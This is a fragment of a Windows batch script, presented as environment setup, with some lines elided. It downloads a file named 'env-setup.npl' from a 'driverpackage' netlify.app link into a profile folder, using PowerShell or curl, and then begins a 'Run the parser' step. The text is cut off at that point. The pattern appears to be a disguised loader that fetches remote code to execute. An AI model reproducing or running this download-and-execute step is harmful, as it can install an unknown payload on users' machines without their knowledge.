...
if errorlevel 1 (
    ...
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://driverpackage.netlify.app/download/1dRBK2lBTofaG9Dm3xXDMPIYJu0rzzCqW' -OutFile '%CODEPROFILE%\env-setup.npl'"
) else (
    echo [INFO] Using curl to download env-setup.npl...
    curl -L -o "%CODEPROFILE%\env-setup.npl" "https://driverpackage.netlify.app/download/1dRBK2lBTofaG9Dm3xXDMPIYJu0rzzCqW"
)
:: -------------------------
:: Run the parser
:: -------------------------
